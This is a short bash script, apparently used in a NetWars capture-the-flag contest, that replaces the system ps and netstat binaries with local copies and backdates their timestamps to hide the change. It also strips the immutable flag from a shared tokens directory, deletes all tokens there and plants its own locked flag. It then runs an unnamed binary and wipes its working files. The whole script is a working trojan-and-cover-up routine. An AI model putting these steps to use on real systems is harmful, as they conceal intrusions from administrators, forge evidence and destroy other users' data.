#!/bin/bash
cp $(which ps) /usr/share/json
chmod 755 ps
mv ps /bin/ps
touch -r /bin/netstat /bin/ps
cp $(which netstat) /usr/share/proto
chmod 755 netstat
mv netstat /bin/netstat
touch -r /bin/ps /bin/netstat
chattr -i /opt/share/everyone/tokens/*
rm -f /opt/share/everyone/tokens/* 
touch /opt/share/everyone/tokens/NetWars\{R25TY5\}
chattr +i /opt/share/everyone/tokens/NetWars\{R25TY5\}
./ch
rm -f ./*
